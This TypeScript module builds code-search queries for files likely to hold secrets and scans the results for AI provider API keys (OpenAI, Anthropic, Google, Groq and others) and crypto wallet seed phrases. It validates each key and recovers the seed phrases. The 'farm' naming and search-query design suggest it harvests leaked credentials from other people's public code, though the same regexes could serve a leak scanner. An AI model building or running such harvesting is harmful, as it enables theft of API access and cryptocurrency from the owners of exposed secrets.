import { isValidKey, recoverMnemonic } from './apiKeyValidator';
import { FARM_CONSTANTS } from './farmConstants';

export interface ProviderRule {
  name: string;
  label: string;
  regex: RegExp;
  prefixes: string[];
  keywords?: string[];
}

const PROVIDER_RULES: ProviderRule[] = [
  {
    name: 'openai',
    label: 'OpenAI',
    regex: /\b(sk-(?:proj-|svcacct-)?[A-Za-z0-9\-]{20,}|sk-[A-Za-z0-9]{48})\b/,
    prefixes: ['sk-']
  },
  {
    name: 'anthropic',
    label: 'Anthropic',
    regex: /\bsk-ant-(?:api\d{0,2}-|v\d+-|[a-zA-Z0-9]+-)?[a-zA-Z0-9\-_]{20,120}\b/,
    prefixes: ['sk-ant-']
  },
  {
    name: 'google',
    label: 'Google',
    regex: /\bAIza[0-9A-Za-z\-_]{35,40}\b/,
    prefixes: ['AIza']
  },
  {
    name: 'openrouter',
    label: 'OpenRouter',
    regex: /\bsk-or-(?:v1-)?[a-zA-Z0-9\-]{20,}\b/,
    prefixes: ['sk-or-']
  },
  {
    name: 'xai',
    label: 'xAI (Grok)',
    regex: /\bxai-[a-zA-Z0-9]{32,}\b/,
    prefixes: ['xai-']
  },
  {
    name: 'groq',
    label: 'Groq',
    regex: /\b(gsk_[a-zA-Z0-9]{52,56}|groq_[a-zA-Z0-9]{32,64})\b/,
    prefixes: ['gsk_', 'groq_']
  },
  {
    name: 'cerebras',
    label: 'Cerebras',
    regex: /\bcsk-[a-zA-Z0-9]{32,64}\b/,
    prefixes: ['csk-']
  },
  {
    name: 'bip39_seed_phrase',
    label: 'Crypto Wallet Seed Phrase',
    regex: /((?:mnemonic|seed[_-]?phrase|secret[_-]?recovery[_-]?phrase|wallet[_-]?secret|wallet[_-]?mnemonic|master[_-]?key)[\s"':=]+)((?:[a-z]{3,}\s+){11,23}[a-z]{3,})\b/i,
    prefixes: [],
    keywords: ['mnemonic', 'seed', 'recovery', 'bip39', 'wallet', 'master']
  }
];

function buildSearchQueries(): Record<string, string[]> {
  const queries: Record<string, string[]> = {};
  for (const rule of PROVIDER_RULES) {
    const allQueries: string[] = [];
    const searchTerms = rule.prefixes.length > 0 ? rule.prefixes : (rule.keywords || []);
    for (const term of searchTerms) {
      const termQueries = FARM_CONSTANTS.PATTERNS.HIGH_RISK_FILES.map(
        file => `filename:${file} ${term}`
      );
      allQueries.push(...termQueries);
    }
    queries[rule.name] = allQueries.filter(q => q.trim());
  }
  return queries;
}

export const PROVIDER_NAMES = PROVIDER_RULES.map(r => r.name);
export const PROVIDER_LABELS = PROVIDER_RULES.map(r => ({ value: r.name, label: r.label }));
export const PROVIDER_QUERIES = buildSearchQueries();
export const TIME_RANGE_DAYS: Record<string, number> = { '7d': 7, '15d': 15, '30d': 30 };
export const TIME_RANGE_OPTIONS = [
  { value: 'all', label: 'All' },
  { value: '7d', label: 'Last 7 Days' },
  { value: '15d', label: 'Last 15 Days' },
  { value: '30d', label: 'Last 30 Days' },
];
export const SORT_OPTIONS = [
  { value: 'newest', label: 'Newest First' },
  { value: 'oldest', label: 'Oldest First' },
  { value: 'provider', label: 'Provider' }
];

export class RegexRouter {
  private prefixMap: Map<string, ProviderRule[]> = new Map();
  private keywordRules: ProviderRule[] = [];
  private triggerRegex: RegExp;

  constructor() {
    const prefixes = new Set<string>();
    for (const rule of PROVIDER_RULES) {
      if (rule.prefixes.length > 0) {
        for (const prefix of rule.prefixes) {
          prefixes.add(prefix.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
          if (!this.prefixMap.has(prefix)) {
            this.prefixMap.set(prefix, []);
          }
          this.prefixMap.get(prefix)!.push(rule);
        }
      } else if (rule.keywords && rule.keywords.length > 0) {
        this.keywordRules.push(rule);
      }
    }
    this.triggerRegex = new RegExp(Array.from(prefixes).join('|'), 'g');
  }

  public scan(content: string): { key: string; provider: string }[] {
    const results: { key: string; provider: string }[] = [];
    const foundKeys = new Set<string>();

    // Memory-efficient trigger-based scanning
    let match: RegExpExecArray | null;
    this.triggerRegex.lastIndex = 0; // Reset global regex for fresh scan

    while ((match = this.triggerRegex.exec(content)) !== null) {
      const startIndex = match.index;

      // Extract a reasonable chunk forward to find the full token
      // 150 chars is safe for all current provider key lengths
      const potentialChunk = content.slice(startIndex, startIndex + 150);

      // Extract the specific token starting from the trigger
      const tokenMatch = potentialChunk.match(/^[a-zA-Z0-9_\-+=]{20,}/);
      const token = tokenMatch?.[0];
      if (!token) continue;

      if (foundKeys.has(token)) {
        // Skip ahead to end of this known key
        this.triggerRegex.lastIndex = startIndex + token.length;
        continue;
      }

      let matched = false;
      // Sort prefixes by length descending for precision (e.g., sk-ant- before sk-)
      const sortedPrefixes = Array.from(this.prefixMap.keys()).sort((a, b) => b.length - a.length);

      for (const prefix of sortedPrefixes) {
        if (token.startsWith(prefix)) {
          const rules = this.prefixMap.get(prefix);
          if (rules) {
            for (const rule of rules) {
              if (rule.regex.test(token) && isValidKey(token)) {
                results.push({ key: token, provider: rule.name });
                foundKeys.add(token);
                matched = true;
                break;
              }
            }
          }
        }
        if (matched) break;
      }

      // If we found a valid key, skip the trigger pointer to its end to avoid redundant sub-matches
      if (matched) {
        this.triggerRegex.lastIndex = startIndex + token.length;
      }
    }

    for (const rule of this.keywordRules) {
      const lower = content.toLowerCase();
      if (!rule.keywords!.some(kw => lower.includes(kw))) continue;
      const match = rule.regex.exec(content);
      if (match && match[2]) {
        let phrase = match[2].trim();

        // Special validation for seed phrases
        if (rule.name === 'bip39_seed_phrase') {
          const recovered = recoverMnemonic(phrase);
          if (!recovered) continue;
          phrase = recovered;
        }

        if (!foundKeys.has(phrase)) {
          results.push({ key: phrase, provider: rule.name });
          foundKeys.add(phrase);
        }
      }
    }

    return results;
  }
}

export const regexRouter = new RegexRouter();
